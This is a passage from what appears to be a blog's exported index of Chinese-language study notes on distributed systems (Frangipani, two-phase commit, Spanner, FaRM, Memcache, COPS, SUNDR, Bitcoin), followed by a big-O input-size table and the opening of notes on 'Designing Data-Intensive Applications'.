Lock），儘管實際上Frangipani中的鎖更加複雜可以支持兩種模式：要么允許一個寫入者持有鎖，要么允許多個讀取者持有鎖\n\n\n\n\nworkstation\n\nfile, lock state, file content的table\n\n\nBUSY: 正在跑syscall\nIDLE: syscall跑完了\n\n只要係統調用結束了，工作站會在內部釋放鎖\n但是從鎖服務器的角度來看，工作站仍然持有鎖 (延遲將鎖還給鎖服務器)\n\n像是folder，就算read好，也許還會在目錄底下再做一些事\n\n\n\n\n\n\n\n\n\nFrangipani應用了很多的規則，這些規則使得Frangipani以一種提供緩存一致性的方式來使用鎖\n\n工作站不允許持有緩存的數據，除非同時也持有了與數據相關的鎖\n先向Petal存儲系統寫數據，之後再釋放鎖\n\n如果你在釋放鎖之前，修改了鎖保護的數據，那你必須將修改了的數據寫回到Petal，只有在Petal確認收到了數據，你才可以釋放鎖\n最後再從工作站的lock表單中刪除關文件的鎖的記錄和緩存的數據\n\n\n\n緩存一致性的訊息\n\nRequest: 拿鎖\nGrant: lock server通知拿到鎖了\n\n如果從鎖服務器的lock表單中發現鎖已經被其他人持有了，那鎖服務器不能立即交出鎖。\n但是一旦鎖被釋放了，鎖服務器會回復一個Grant消息給工作站\n\n這裡的Request和Grant是異步的\n\n\n\n\nRevoke: 要求歸還鎖\n\n如果別人要用，同時workstation的lock state是idle，就會開始跑release lock\n\n\nRelease: 還鎖\n\n在還之前會先把log與髒的資料寫回去\n\n\n\n優化\n\nidle做延遲還鎖\nFrangipani有共享的讀鎖（Shared Read Lock）和排他的寫鎖（Exclusive Write Lock）\n\n原子性（Atomicity）\n要么發現文件不存在，要么文件完全存在，但是我們絕不希望它看到中間狀態\nFrangipani在內部實現了一個數據庫風格的事務系統，並且是以鎖為核心。並且，這是一個分佈式事務系統\n\n首先我的工作站需要獲取所有我需要讀寫數據的鎖，在完成操作之前，我的工作站不會釋放任何一個鎖\n為了遵循一致性規則（11.3），將所有修改了的數據寫回到Petal之後，我的工作站才會釋放所有的鎖\n之後完成所有的步驟，比如完成所有數據的更新，並將更新寫入到Petal，最後釋放鎖\n\nFrangipani使用鎖實現了兩個幾乎相反的目標。\n對於緩存一致性，這裡使用鎖來確保寫操作可以被看見。\n但是對於原子性來說，鎖確保了人們在操作完成之前看不到任何寫操作\nFrangipani與其他的系統一樣，需要通過預寫式日誌（Write-Ahead Log，WAL，見10.2）實現故障可恢復的事務（Crash Recoverable Transaction）\n當一個工作站需要完成涉及到多個數據的複雜操作時，在工作站向Petal寫入任何數據之前，工作站會在Petal中自己的Log列表中追加一個Log條目，這個Log條目會描述整個的需要完成的操作\n只有當這個描述了完整操作的Log條目安全的存在於Petal之後，工作站才會開始向Petal發送數據\n\nFrangipani對於每個工作站都保存了一份獨立的Log (一般都是share一個log)\n工作站的Log存儲在Petal，而不是本地磁盤中\n\n每個工作站的獨立的Log，存放在公共的共享存儲中\n\nlog裡面有 (Log只包含了對於元數據的修改)\n\nLog序列號 (找最新的log)\n數組中的每一個元素會有一個Petal中的塊號（Block Number），一個版本號和寫入的數據\n\n類似的數組元素會有多個，這樣就可以用來描述涉及到修改多份文件系統數據的操作。\n\n\n\n\n向Petal寫入數據的時候，如果我們在中途故障退出了，我們需要確認其他組件有足夠的信息能完成我們未完成修改 (log)\n如果出事可以讓其他workstation利用原本的log redo!!\n\n\n\n\n\nDistributed Transaction\n\n並發控制（Concurrency Control）\n\n並發控制就是可序列化的別名\nPessimistic (mutex)\n\n兩階段鎖（Two-Phase Locking）\n\n在使用任何數據之前，在執行任何數據的讀寫之前，先獲取鎖\n事務必須持有任何已經獲得的鎖，直到事務提交或者Abort，你不允許在事務的中間過程釋放鎖\n\n\n\n\nOptimistic (rwlock)\n\n\n原子提交（Atomic Commit）\n\n從部分故障中恢復的能力\n兩階段提交（Two-Phase Commit）\n\n除了原本的DB，還有一台Transaction Coordinator\n\n因為是transaction，各自的DB會拿有關的所有鎖\n開始跑指令\n發preare問參與事務的DB好了沒\n\nTC發prepare/commit之前掛了\n\n基於log，重發 (可能需要標這是重複的)\n\n\nTC發prepare/commit之後掛了\n\nlog還原自己的狀態\n\n\nDB收到preare前掛了\n\nDB重開，發現沒有log，回abort\n\n\nDB收到prepare在回了yes之後掛掉\n\ntransaction的動作、相關狀態，再回prepare之前都要在log\nDB重開，有log與prepare，之後TC發prepare就能回yes\n\n\n\n\n都好了就發commit\n\nDB收到commit之後掛了\n\n回yes之前掛了\n\nredo, 回yes\n\n\n回完yes之後掛了\n\n這個時候所有有關的log都被清了(也許)與該改的都寫到HDD了\n有可能DB是找不到commit相關訊息的\n不論怎樣，DB都會直接回yes\n\n\n\n\n\n\n\n\n\n\n\n\n\n如果遇到網路斷線?\n\nTC可以retry，如果太久就abort\nDB是根據prepare的回答\n\nno\n\n自己abort，之後TC的prepare就發no\n\n\nyes\n\n就是等TC的指令，剩下都不能動!!\n\n只要回prepare yes就是等 (BLOCK)\nA或者B不能決定Commit還是不Commit事務，A和B之間不會交互來達成一致並完成事務的Commit，相反的只有事務協調者可以做決定\n\n\n\n\n\n\n\n數據庫通常對於正確性有一個概念稱為ACID\n可序列化是指，並行的執行一些事物得到的結果，與按照某種串行的順序來執行這些事務，可以得到相同的結果\n使用Raft可以通過將數據複製到多個參與者得到高可用。\nRaft的意義在於，即使部分參與的服務器故障了或者不可達，系統仍然能工作。\nRaft能做到這一點是因為所有的服務器都在做相同的事情，所以我們不需要所有的服務器都參與，我們只需要過半服務器參與\n兩階段提交，參與者完全沒有在做相同的事情，每個參與者都在做事務中的不同部分，比如A可能在對X加1，B可能在對Y減1。\n所以在兩階段提交中，所有的參與者都在做不同的事情。\n所有的參與者都必須完成自己那部分工作，這樣事務才能結束，所以這裡需要等待所有的參與者。\nRaft完全就是可用性，而兩階段提交完全不是高可用的，系統中的任何一個部分出錯了，系統都有可能等待直到這個部分修復\n同時具備Raft的高可用性，但同時又有兩階段提交的能力將事務分包給不同的參與者。\n這裡的結構實際上是，通過Raft或者Paxos或者其他協議，來複製兩階段提交協議裡的每一個組成部分。\n\nspanner\n需求 &amp; 前提\n\n大部分的workload都是read-only transactions\n\nread要快\n\nspanner區分read/write &amp; read/only transaction\n\n\n\n\n更好的synchronous replication\nflexible sharding\n分散式transaction (橫跨多個shard)\n\n2pc真的慢，要別的方法\n\n\nExternal consistency\n\nlinearizability + serializability\n\n\n\n為了可用性，所以把distributed tranasaction的每個元件包成one Paxos group\nread/write transactions\n\ntwo-phase commit (2pc) with Paxos-replicated participants\n\n基本上與2pc步驟一樣但是所有溝通都是由各個shard的leader做\n\n在shard的leader中有lock table\n\n\n\n\n2pc所以很慢\nparallelism\n\nmany clients, many shards\n\n\n\nread/only transactions\n\n兩個重點\n\n沒有2pc\n只從local replica讀\n\n\n正確性\n\nSerializable\nExternally consistent\n\n為什麼不直接讀最新commit的值?\n\nT1:  Wx  Wy  C\nT2:                 Wx  Wy  C\nT3:             Rx             Ry\n\n\n\n\n\n\nSnapshot Isolation (SI)\n\n用wall-time做timestamp(TS)\n\n怎麼synchronize wall-time?\n\nTrueTime\n\nTTinterval = [ earliest, latest ]\n在這個區間一定有對的時間\n\n\n\n\n\n\n只拉同一個TS的資料(最少不能超過read的TS)\n\n怎麼確保replica夠新?\n\nreplica “safe time”\n\nread上給時間，直到replica上看到write的時間夠後面才serve\n\n\n\n\n\n\n每個transaction都有time-stamp\n\nr/w: commit time.\nr/o: start time.\nSynchronized timestamps確保external consistency (commit wait)\n\n\nSI確保serializable r/o transactions\n\n\n怎麼確保r/w在r/o之前完成 (Commit wait)\n\n定義transacation的TS\n\nxaction TS = TT.now().latest\nfor r/o, at start time\nfor r/w, when commit begins\n\n\n在r/w跑commit之前，Commit wait\n\nBefore commit, delay until TS &lt; TS.now().earliest\n\n\n\n\n\nFaRM, Optimistic Concurrency Control\nFaRM &amp; Spanner差在\n\n都用2pc\nSpanner\n\ngeographic replication\nr/o transaction &amp; TrueTime\nbottleneck: speed of light and network delays\n\n\nFaRM\n\n都在同一個data center\nRDMA(remote dma)限制只能用Optimistic Concurrency Control (OCC)\n\nOptimistic Concurrency Control\n\nsteps\n\nread不用lock\nwrite直到commit才會真的寫入\ncommit檢查有沒有衝突\n\n\n不用server參與!!\n\none-sided RDMA\n\nsender給mem addr, read整個cache line\n\n\n\n\n\n\n\n\nbottleneck: CPU time on servers\n都用ram存資料\n\nnon-volatile RAM\n\n每個rack都有電池在出事之前可以把ram寫到hdd\n\n\n\n\n\n\n\n架構\n\n\nAPI(simplified)\n\nFaRM transaction API (simplified):\n\ntxCreate()\no = txRead(oid)  – RDMA\n\noid?\n\n&lt;region #, address&gt;\nregion # indexes a mapping to [ primary, backup1, ... ]\ntarget RDMA NIC uses address directly to read or write RAM\n\n\n\n\no.f += 1\ntxWrite(oid, o)  – purely local\nok = txCommit()  – Figure 4\n\n\n\n流程\n\n跑指令\nLOCK\n\n檢查lock state, version\n往primary上打log，之後等return yes\nVALIDATE\n\none-sided RDMA read to re-fetch object’s version and lock flag\n\nfail early\nT1:  Rx  Ly  Vx  Cy\nT2:  Ry  Lx  Vy  Cx\n\nLOCKs will both succeed\nVALIDATEs will both fail\n\n\n\n\n\n\nCOMMIT BACKUP\n\n在commit之前至少backup要有法定人數台機器有新的值\n\na committed write might be revealed as soon the first COMMIT-PRIMARY is sent\n\n\nLOCK 通知 primaries 有新值\nCOMMIT-BACKUP 通知 backups 有新值\n\n不一定馬上處理，會放在log中\n\n\n直到LOCKs與COMMIT-BACKUPS都完成，TC才發COMMIT-PRIMARY\n\n2pc中COMMIT之後就是\n\n狀態都ok了\n不能回頭了\n\n\n\n\n\n\n\n\nCOMMIT PRIMARY\n\n就是最後的commit\n\n往primary上打log\n\n\nprimary清狀態, version++, 把值寫進去\n\n\n\n\nfault tolerance?\n\n假設總是有一個backup在\n\n\n\nspark\nskip\nScaling Memcache at Facebook\n網站的成長旅程\n\n一台host = web server + DB  + app\n\napp吃爆cpu\n\n\n多台web server + app, 一台DB\n\nDB只有一台\n\n\n多台web server + app, 多台DB\n\n做shard，如果沒有特別熱門的key就沒事\n\ncross-shard transactions &amp; queries基本不能做了\n\n\nread變慢!!\n\n\n多台web server + app, 多台DB for write, cache for read\n\ncache怎麼與db sync\n沒有成功cache hit，DB的load直接起飛\n\nwarm-up\ncache miss\n\n\n接下去就是DB write，但這很難解\n\n\n\n\n\n教訓\n\n\npartition 或 replicate\n\npartition: divide keys over mc servers\n\ngood: ram花得少 (kv不用重複copy)\nbad: web server要一次問很多台\n\nhuge “fan-out” =&gt; parallel fetch, in-cast congestion\n\n\n適用: key沒有很熱門 (不用每個data center都放)\n\n\nreplicate: divide clients over mc servers\n\ngood: 比較少tcp連線\nbad: 比較少key能被cache\n適用: key很熱門\n\n\n\n\n\nregion (data center)\n\nlower RTT to users\nquick local reads, from local mc and DB\n\nwrites 很慢，一定要到primary\n\n\n多 mc clusters 在 每個 region\n\n“regional pool” shared by all clusters =&gt; unpopular objects (no need for many copies)\n\n\n\n\n\nwarmup is painful\n\nget miss =&gt; 打DB =&gt; 去set cache\n\n只給第一個req設定cache的權限(lease)\n其他就先等\n\nmc tells others “try get() again in a few milliseconds”\n\n\n\n\n\n\n\n容錯?\n\npool of idle mc servers, clients only use after mc server fails\n\n\n\n網路\n\nget\n\nUDP\n\n\nset\n\nTCP\n\n\n把req累積成一個packet\n\nmcrouter batches many requests into each packet\n\n\n\n\n\nconsistency\n\nnot more than a few seconds stale\nread-your-own-writes (due to delete())\n\ncache怎麼與DB sync (delete)\n\nDB去做\nwriting client去做\n\n\n\n\n\ndelete會有racing\nRace 1\n真正的race, 用樂觀鎖、rwlock解\nk not in cacheC1 get(k), missesC1 v1 = read k from DB    C2 writes k = v2 in DB    C2 delete(k)C1 set(k, v1)\nget時會給一個lease，如果有delete就會把lease取消掉，之後看有沒有lease決定要不要吃這個set\nRace 2\n與race3很像，都是因為write傳播太慢，導致source資料不對，這裡因為是cold所以只能從hot copy，所以wait hot試試看有沒有可能ok\n在warm-up時，get從warm cluster拉資料k starts with value v1C1 updates k to v2 in DBC1 delete(k) -- in cold clusterC2 get(k), miss -- in cold clusterC2 v1 = get(k) from warm cluster, hitsC2 set(k, v1) into cold cluster\ncold cluster會在2秒中忽略set，去等warm收到DB資料\nRace 3\nsource是local db，但是我們知道才剛update，所以標上要從remote拉\nk starts with value v1C1 is in a secondary regionC1 updates k=v2 in primary DBC1 delete(k) -- local regionC1 get(k), missC1 read local DB  -- sees v1, not v2!later, v2 arrives from primary DB\nC1做delete時把key標上&quot;remote mark&quot;\n讓後面的人去DB拉資料\nCausal Consistency, COPS\nwe’ve seen two solutions for geo-replication\nSpanner\nwrites involve Paxos and perhaps two-phase commit\nPaxos quorum for write must wait for some remote sites\nno one site can write on its own\nbut has read transactions, consistent, fairly fast\nFacebook / Memcache\nwrites must go to the primary site’s MySQL\nagain, non-primary sites cannot write on their own\nbut reads are blindingly fast (1,000,000 per second per memcache server)\n情境\n\n3 data centers\ndata centers有各自的shard\n\nver1: eventually consistent\n\n\nreads and writes just local shard\n\n會自己把write推到其他data center\n\n\n\neventually consistent\n\nclient看到update的順序不確定\nwrite要等夠久才看的到\n例子\n\nquorum, with overlap (Dynamo/Cassandra)\nlocal write + asynchronously push\n\n\n\n\n\n每個put加個timestamp(version)?\n\nCOPS用Lamport clocks設定timestamp\n\nTmax = highest v# seen (from self and others)\nT = max(Tmax + 1, wall-clock time)\n\n\nconcurrent write時，要選哪一個write?\n\nlast-writer-wins?\n\nincrement a counter時會起飛\n\n\n需要其他方式做merge\n\nreal transactions\nmini-transactions (atomic)\n特定的合併方式 (set union)\naction transform\nmvcc\n\n\nresolution of conflicting writes is a problem for eventual/causal consistency\n\nno single “serialization point” to implement atomic operations or transactions\n\n\n\n\n\n\n\nver2: barrier\n\n留個sync指令\n\n直到確認每個datacenter都有夠新的key才return\n\n\n需要等 (慢)\n\n但其他work其實寫都要等\n\nspanner等majority of replica\nfb’s cache等primary datacenter\n\n\n\n\n不需要transaction不失為一個不錯的方案\n\nver3: log\n\n每個datacenter都有一個log server\n\nwrite對應到一個log\n\n\ndatacenter把log送到其他datacenter\n\ndatacenter照log順序跑\n\n\nlog server會是bottleneck\n\nCOPS: client’s context\n\nclient的context會記錄下指令的順序\n\n這就是dependency\n\n\n\nget(X)-&gt;v2    context: Xv2get(Y)-&gt;v4    context: Xv2, Yv4put(Z, -)-&gt;v3    client sends Xv2, Yv4 to shard server along with new Z    context: Xv2, Yv4, Zv3    (COPS optimizes this to just Zv3)\nshard怎麼處理?\n\nlocal shard\n\n收到put(Z, -, Yv4)\n\n設定時間: v# = 3 for Z\nwrite: Z, -, v3\n傳送到其他datacenter(不等reply)\n\n\n\n\nremote shard\n\n收到Z/-/v3/Yv4\n\n會等到Yv4到了才設定Z/-/v3\n\n\n\n\n\n\ncausal consistency\n\n\ndependency來自?\n\nclient的一連串puts and gets\n當read來自其他client資料的時候\n\n\n\n這dependency是transitive\n\n\n可能拿到比想像中更新的資料\n\n不能用在transaction或是snapshot\n\n\n\nget_trans(k1,k2,…)\n\nclient檢查dep對不對，不對就重拿不對的\n只有read的mini-transaction\nscenerio: ACL\n\nget(ACL), then get(list)?\n\nwhat if someone deletes you from ACL, then adds a photo?\n\n\nget(list), then get(ACL)?\n\nwhat if someone deletes photo, then adds you to ACL?\n\n\n\n\n\n\n\nSecure Untrusted Data Repository (SUNDR)\nintegrity\n\nsource code的server\n\nbad\n\n在source code放backdoor\n忽略一些fix\n\n\nSerious problem\n\nPaper mentions Debian server compromised in 2003.\nSourceForge compromised in 2011.\nCanonical (Ubuntu) compromised in 2019.\n\n\n\n\n\nNaive design: sign file contents.\n\n只能保證檔案內容與作者是誰\n但server可以\n\n亂送其他版本的檔案\n假裝檔案不在\n\n\n\nFork consistency\n\n每個fork看到都一樣\n容易找出攻擊\n難以假造log\n\nSUNDR: log of operations.\n\nlog: fetch or modify, user, sig.\n\n簽名要包含所有log\n\n\nsteps\n\n下載log\ncheck log\n做事(Construct FS state)\n加上log與簽名\n上傳log\n\n\n包含所有log?!\n\n超慢\n\n簽名慢\ncheck慢\n\n\n優化\n\n只看最後一個簽名 (前面的一定被確認過了)\n只要簽自己改過的地方就好 (一堆inode =&gt; i-table)\n\n\n\n\n\nIdea: signed version vectors.\nVersion vector: user -&gt; how many operations that user performed.\nVersion structure: signed i-handle together with version vector.\nConsistency\nConsistency就是發生效果的亂序程度\n越弱越難預期\n有兩個排序單位\n\noperation\ntransaction\n\neventual Consistency\n總有一天會拿到最新的結果\n沒有時間序、執行序\nCausal Consistency\n某部分效果發生是有序的(有因果關係)\n這也是通常concurrent programming使用的Consistency\nSequential Consistency\n效果發生照執行序來，所以如果concurrent可能有超過一種排列組合\n因為一般concurrent programming沒有transaction的概念，所以從這開始就有人叫strong Consistency\nLinearizability\n照執行序來、時間序 (看前面的定義)\n但是transaction的執行順序不確定(也許r/w有序，但ro穿插其間)\nStrict Serializability\n照執行序來、執行序、transaction的執行順序確定\n一般提到distributed system的consistemcy最多提到上面5種，因為通常討論transaction都是DB範圍\n比較完整的圖在這\n\n可以到來源看定義\n這邊備註一下PRAM，就是FIFO Consistency(zookeeper)\nRef\nConsistency\nConsistency Models\nbitcoin\n在byzantine中共識\n\n像SUNDR\n\n簽過的log與fork\n\n\n不像SUNDR\n\n分散式的選用fork\n\n\n\n組成\n\n\nledger record\n\npub(user1)\n\n新owner的public key\n\n\nhash(prev)\n\n前一個transaction的hash\n\n\nsig(user2)\n\n前owner的簽名\n\n\n(其他: amount (fractional), multiple in/out, …)\n\n\n\ntransaction 例子\n\nY 擁有一枚硬幣，之前由 X 給它：\n\nT6：pub(X)，…\nT7：pub(Y)、hash(T6)、sig(X)\n\n\nY 從 Z 買了一個漢堡包並用這枚硬幣付款\nZ 將公鑰發送給 Y\nY 創建一個新交易並對其進行簽名\n\nT8：pub(Z)、hash(T7)、sig(Y)\n\n\nY 向 Z 發送交易記錄\nZ 驗證：\n\nT8 的 sig(Y) 對應 T7 的 pub(Y)\n\n\nZ給Y漢堡包\n\n\n\nblock chain\n\n一個coin可以花兩次嗎?\n\n可以，創兩個transaction\n\ncoin其實源自於transaction，有transaction才有coin\n\n\n別阿\n\n\n需要一個共同依據\n\nfork consistency\n\n有所有交易紀錄\n大家看到的都一樣的\n做了就不能反悔\n\n\n參與者可能會做壞事\n\n挑最長的chain\n\n\n\n\nblock有\n\nhash(prevblock)\nset of transactions\ncurrent time (wall clock timestamp)\n“nonce” (類似隨機資料)\n\n\n誰可以產生block\n\nminer (proof-of-work, nonce要有N個0，所以要try)\n\n\n怎麼交易\n\n假設現在block在B7\npayer先flood我要交易到peer\nminer把交易記錄起來，等B8(目前mine的block)好\n\n每10分鐘一個block產生\n\n\n把交易記錄放到B9\npayee看到交易記錄就可以接受交易\n\n\n能產生分支嗎?\n\n能\n\n在同一時間找到同樣的nonce\nnetwork問題\n\n\n怎麼處理\n\nminer挑最長的append\n\n這能hack吧 (yes)\n\n但要能做出更長的chain\n\n\n\n\n\n\n\n\n\n\n\n壞處\n\n超慢\nflood限制效能與攻擊點\n只要有人有過半的算力就能控制整個chain\nuser要保護好private key\n\nDAPP\nDAPP怎麼工作的\n\n從remote server拉資料\nDAPP處理寫回去\n\n好處\n\n換app很方便，因為資料不會被綁在app上\n\ntodo的項目可以在todo list, microsoft todo上通用\n\n\napp有通用的資料格式\n\n壞處\n\n分散式很複雜\n資料加密與server安全\n\nRef\n6.824的部分中文翻譯\nMIT6.824_2021_note\n分布式系统概念简介及其问题的描述\nDesign Principles\n","categories":["System","Distributed"]},{"title":"bigO對應到的input大小","url":"/2021/01/big-o-n-seconds/","content":"動機\n一直很疑惑input與bigO之間的n大概是多少，所以把參考的表格存一份在這裡\n\n上結論\n\n\n\n Length of Input (N) \n Worst Accepted Algorithm \n\n\n\n\n ≤[10..11]\\le [10..11] \n O(N!),O(N6)O(N!), O(N^6) \n\n\n  ≤[15..18]\\le [15..18] \n O(2N∗N2)O(2^N * N^2) \n\n\n ≤[18..22]\\le [18..22] \n O(2N∗N)O(2^N * N) \n\n\n ≤100\\le 100 \n O(N4)O(N^4) \n\n\n ≤400\\le 400 \n O(N3)O(N^3) \n\n\n ≤2K\\le 2K \n O(N2∗logN)O(N^2 * logN) \n\n\n ≤10K\\le 10K \n O(N2)O(N^2) \n\n\n ≤1M\\le 1M \n O(N∗logN)O(N * logN) \n\n\n ≤100M\\le 100M \n O(N),O(logN),O(1)O(N), O(logN), O(1) \n\n\n\nRef\nTime and Space Complexity\n","categories":["Algorithm","Tips"]},{"title":"Designing Data-Intensive Applications","url":"/2022/01/Designing-Data-Intensive-Applications/","content":"動機\n不可多得的一本書，把所有與DB與distrubuted computing的手法與議題都說了一遍\n有簡中翻譯\n\n第一章 可靠性，可伸縮性，可維護性\n應用分成\n\n數據密集型的，如果數據是其主要挑戰\n計算密集型，即處理器速度是其瓶頸\n\n這裡談數據密集型，他們會需要\n\n存儲數據，以便自己或其他應用程序之後能再次找到 （數據庫，即 databases）\n記住開銷昂貴操作的結果，加快讀取速度（緩存，即 caches）\n允許用戶按關鍵字搜索數據，或以各種方式對數據進行過濾（搜索索引，即 search indexes）\n向其他進程發送消息，進行異步處理（流處理，即 stream processing）\n定期處理累積的大批量數據（批處理，即 batch processing）\n\n有3個重點\n\n可靠性（Reliability）\n\n系統在困境（adversity，比如硬件故障、軟件故障、人為錯誤）中仍可正常工作（正確完成功能，並能達到期望的性能水準）\n\n正常工作\n\n可靠性粗略理解為“即使出現問題，也能繼續正確工作”\n\n\n設計容錯機制以防因故障而導致失效\n\n故障通常定義為系統的一部分狀態偏離其標準\n失效則是系統作為一個整體停止向用戶提供服務\n\n\n通過故意觸發來提高故障率是有意義的\n\n例如：在沒有警告的情況下隨機地殺死單個進程。\n\n許多高危漏洞實際上是由糟糕的錯誤處理導致的\n\n\nNetflix公司的Chaos Monkey\n\n\n比起阻止錯誤（prevent error），我們通常更傾向於容忍錯誤\n\n硬件故障\n\n為了減少系統的故障率，第一反應通常都是增加單個硬件的冗余度\n\n硬件冗余對於大多數應用來說已經足夠了，它使單台機器完全失效變得相當罕見\n只要你能快速地把備份恢覆到新機器上，故障停機時間對大多數應用而言都算不上災難性的\n\n\n但是隨著數據量和應用計算需求的增加，越來越多的應用開始大量使用機器，這會相應地增加硬件故障率\n\n類似亞馬遜AWS（Amazon Web Services）的一些雲服務平台上，虛擬機實例不可用卻沒有任何警告也是很常見的\n\n雲平台的設計就是優先考慮靈活性（flexibility） 和彈性（elasticity），而不是單機可靠性\n\n\n\n\n\n\n軟件錯誤\n\n例子\n\n接受特定的錯誤輸入，便導致所有應用服務器實例崩潰的BUG。例如2012年6月30日的閏秒\n失控進程會用盡一些共享資源，包括CPU時間、內存、磁盤空間或網絡帶寬\n\n\n軟件故障的BUG通常會潛伏很長時間，直到被異常情況觸發為止。\n\n這種情況意味著軟件對其環境做出了某種假設\n\n雖然這種假設通常來說是正確的，但由於某種原因最後不再成立了\n\n\n\n\n軟件中的系統性故障沒有速效藥，但我們還是有很多小辦法\n\n仔細考慮系統中的假設和交互；徹底的測試；進程隔離；允許進程崩潰並重啟；測量、監控並分析生產環境中的系統行為。\n如果系統能夠提供一些保證（例如在一個消息隊列中，進入與發出的消息數量相等），那麽系統就可以在運行時不斷自檢\n\n\n\n\n人為錯誤\n\n以最小化犯錯機會的方式設計系統\n\n精心設計的抽象\n\n如果接口限制太多，人們就會忽略它們的好處而想辦法繞開\n\n\n將人們最容易犯錯的地方與可能導致失效的地方解耦（decouple）\n\n特別是提供一個功能齊全的非生產環境沙箱（sandbox）\n\n\n在各個層次進行徹底的測試\n允許從人為錯誤中簡單快速地恢覆，以最大限度地減少失效情況帶來的影響\n配置詳細和明確的監控，比如性能指標和錯誤率\n\n\n\n\n\n\n\n\n\n\n可伸縮性（Scalability）\n\n有合理的辦法應對系統的增長（數據量、流量、覆雜性）。\n描述負載\n\n在討論增長問題（如果負載加倍會發生什麽？）前，首先要能簡要描述系統的當前負載\n\n參數的最佳選擇取決於系統架構 (例子)\n\n每秒向Web服務器發出的請求\n數據庫中的讀寫比率\n聊天室中同時活躍的用戶數量\n緩存命中率或其他東西\n\n\n\n\n\n\n描述性能\n\n一旦系統的負載被描述好，就可以研究當負載增加會發生什麽\n\n增加負載參數並保持系統資源（CPU、內存、網絡帶寬等）不變時，系統性能將受到什麽影響？\n增加負載參數並希望保持性能不變時，需要增加多少系統資源？\n\n\n例子\n\n批處理系統，通常關心的是吞吐量（throughput）\n\n理想情況下，批量作業的運行時間是數據集的大小除以吞吐量。\n在實踐中由於數據傾斜（數據不是均勻分布在每個工作進程中），需要等待最慢的任務完成，所以運行時間往往更長\n\n\n對於在線系統，通常更重要的是服務的響應時間（response time）\n\n響應時間可能會有很大差異。\n\n因此我們需要將響應時間視為一個可以測量的數值分布（distribution）\n\n而不是單個數值\n\n\n百分位點（percentiles）\n\n然而如果你想知道“典型（typical）”響應時間，那麽平均值並不是一個非常好的指標\n\n因為它不能告訴你有多少用戶實際上經歷了這個延遲\n選50百分點(中位數)\n\n\n為了弄清異常值有多糟糕，可以看看更高的百分位點，例如第95、99和99.9百分位點\n\n響應時間的高百分位點（也稱為尾部延遲，即tail latencies）非常重要，因為它們直接影響用戶的服務體驗\n排隊延遲（queueing delay） 通常占了高百分位點處響應時間的很大一部分。\n\n由於服務器只能並行處理少量的事務（如受其CPU核數的限制）\n\n只要有少量緩慢的請求就能阻礙後續請求的處理，這種效應有時被稱為 頭部阻塞（head-of-line blocking）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可維護性（Maintainability）\n\n許多不同的人（工程師、運維）在不同的生命周期，都能高效地在系統上工作（使系統保持現有行為，並適應新的應用場景）\n可操作性：人生苦短，關愛運維\n\ndeploy, monitor, update, nice infra, predictable\n\n\n簡單性：管理覆雜度\n\n覆雜度\n\n額外覆雜度\n\n由具體實現中湧現，而非（從用戶視角看，系統所解決的）問題本身固有的覆雜度\n\n\n消除額外覆雜度的最好工具之一是抽象（abstraction）\n\n一個好的抽象可以將大量實現細節隱藏在一個幹凈，簡單易懂的外觀下面\n\n\n\n\n\n\n可演化性：擁抱變化\n\n\n\n第二章 數據模型與查詢語言\n數據模型們的影響如此深遠：不僅僅影響著軟件的編寫方式，而且影響著我們的解題思路\n多數應用使用層層疊加的數據模型構建。\n對於每層數據模型的關鍵問題是：它是如何用低一層數據模型來表示的\n\n關系模型\n\nscenario\n\n事務處理\n批處理\n\n\n對象關系不匹配\n\n如果數據存儲在關系表中，那麽需要一個笨拙的轉換層，處於應用程序代碼中的對象和表，行，列的數據庫模型之間\n\n一對多的關系 (適合文件型)\n\nSQL的作法\n\n正規化與外鍵\n放JSON\n\n在col中\nencode成string\n\n\n\n\n文件的做法\n\n用JSON存\n\nJSON表示比正規化與外鍵的多表模式具有更好的局部性（locality\n\n\n\n\n\n\n多對一和多對多的關系 (適合SQL)\n\n會共用資料!!\n\n用一個ID代表共用資料\n\n各個簡介之間樣式和拼寫統一\n避免歧義（例如，如果有幾個同名的城市）\n易於更新——名稱只存儲在一個地方，如果需要更改（例如，由於政治事件而改變城市名稱），很容易進行全面更新。\n本地化支持——當網站翻譯成其他語言時，標準化的列表可以被本地化，使得地區和行業可以使用用戶的語言來顯示\n更好的搜索——例如，搜索華盛頓州的慈善家就會匹配這份簡介，因為地區列表可以編碼記錄西雅圖在華盛頓這一事實（從“Greater Seattle Area”這個字符串中看不出來）\nID對人類沒有任何意義，因而永遠不需要改變：ID可以保持不變，即使它標識的信息發生變化。\n\n\n\n\nSQL的作法\n\n正規化與外鍵\n\n\n文件的做法\n\n進行多個查詢來模擬join\n複製到每個有連到的地方 (反正規)\n\n\n即便應用程序的最初版本適合無連接的文檔模型，隨著功能添加到應用程序中，數據會變得更加互聯\n\n\n\n\n\n\n\n\n文檔模型 &amp; 關系模型\n\n關系模型\n\n為連接提供更好的支持\n支持多對一和多對多的關系\n\n\n文檔模型\n\n架構靈活性\n\n大多數文檔數據庫以及關系數據庫中的JSON支持都不會強制文檔中的數據采用何種模式\n沒有模式意味著可以將任意的鍵和值添加到文檔中 (讀時模式（即schema-on-read)\n\n當讀取時，客戶端對無法保證文檔可能包含的字段\n因為讀取數據的代碼通常假定某種結構——即存在隱式模式，但不由數據庫強制執行\n\n集合中的項目並不都具有相同的結構時,讀時模式更具優勢\n\n\n\n\nSQL在改schema時需要migration\n\n\n因局部性而擁有更好的性能\n\n局部性僅僅適用於同時需要文檔絕大部分內容的情況\n\n因此，通常建議保持相對小的文檔，並避免增加文檔大小的寫入\n\n\n\n\n對於某些應用程序而言更接近於應用程序使用的數據結構\n\n\n\n\n圖數據模型\n\n關系模型可以處理多對多關系的簡單情況\n\n但是隨著數據之間的連接變得更加覆雜，將數據建模為圖形顯得更加自然\n\n\n特點\n\n任何頂點都可以有一條邊連接到任何其他頂點。沒有模式限制哪種事物可不可以關聯。\n給定任何頂點，可以高效地找到它的入邊和出邊，從而遍歷圖，即沿著一系列頂點的路徑前後移動。\n通過對不同類型的關系使用不同的標簽，可以在一個圖中存儲幾種不同的信息，同時仍然保持一個清晰的數據模型。\n\n\n\n\n\n第三章：存儲與檢索\n程序員\n\n數據模型: 將數據錄入數據庫的格式\n查詢語言: 再次要回數據的機制\n\n數據庫\n\n\n索引與物化視圖:如何在我們需要時重新找到數據\n\n\n編碼(第四章)與儲存方式: 數據庫如何存儲我們提供的數據\n\n\n驅動數據庫的數據結構\n\nkey &amp; value\n\n\n\n索引（index）\n\n為了高效查找數據庫中特定鍵的值\n任何類型的索引通常都會減慢寫入速度\n\n因為每次寫入數據時都需要更新索引\n\n\n種類\n\nhash 